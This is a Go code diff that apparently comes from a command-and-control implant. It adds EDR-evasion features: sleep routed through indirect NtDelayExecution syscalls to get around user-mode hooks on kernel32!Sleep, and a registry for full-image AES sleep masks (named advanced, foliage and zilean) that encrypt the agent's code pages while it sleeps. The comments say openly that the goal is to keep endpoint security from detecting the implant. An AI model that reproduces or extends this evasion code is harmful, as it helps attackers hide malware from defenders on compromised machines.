@@ -163,9 +163,46 @@ func init() {
 	// Route sleep through an indirect NtDelayExecution syscall so user-mode
 	// hooks on kernel32!Sleep cannot detect/break sleep masking.
 	sleepObfFunc = func(ms uintptr) {
-		if !ekkoReady {
-			initEkko()
-		}
 		indirectNtDelayExecution(time.Duration(ms) * time.Millisecond)
 	}
+}
+
+// advancedMaskFactory, when set by the windows/amd64 build, returns the
+// full-image AES sleep mask. It is promoted to the default mask in
+// InitSleepMask so the agent's own code pages are encrypted during sleep
+// (not just the 4096-byte config buffer). Only windows builds populate or
+// read it, so the declaration lives in this windows-tagged file.
+var advancedMaskFactory func() SleepMasker
+
+// registerSleepMask is the windows-side hook for the full-image technique
+// providers (advanced/foliage/zilean); it feeds the shared kit mask registry.
+func registerSleepMask(name string, factory func() SleepMasker) {
+	maskRegistry[name] = factory
+}
+
+var (
+	sleepDelayOnce sync.Once
+	sleepDelayMgr  *syscallManager
+)
+
+// indirectNtDelayExecution delays via an indirect NtDelayExecution syscall.
+// This bypasses user-mode hooks on Sleep() and prevents EDR from detecting
+// sleep masking via kernel32!Sleep hooking.
+func indirectNtDelayExecution(d time.Duration) {
+	sleepDelayOnce.Do(func() {
+		sleepDelayMgr = newSyscallManager()
+	})
+	mgr := sleepDelayMgr
+	if mgr == nil {
+		// Fallback: use kernel32 Sleep if the syscall manager is unavailable
+		procSleep.Call(uintptr(d.Milliseconds()))
+		return
+	}
+	// NtDelayExecution interval is in 100-ns units, NEGATIVE = relative
+	ms := d.Milliseconds()
+	if ms < 1 {
+		ms = 1
+	}
+	interval := ms * -10000 // negative = relative
+	syscallNtDelayExecution(mgr, false, &interval)
 }
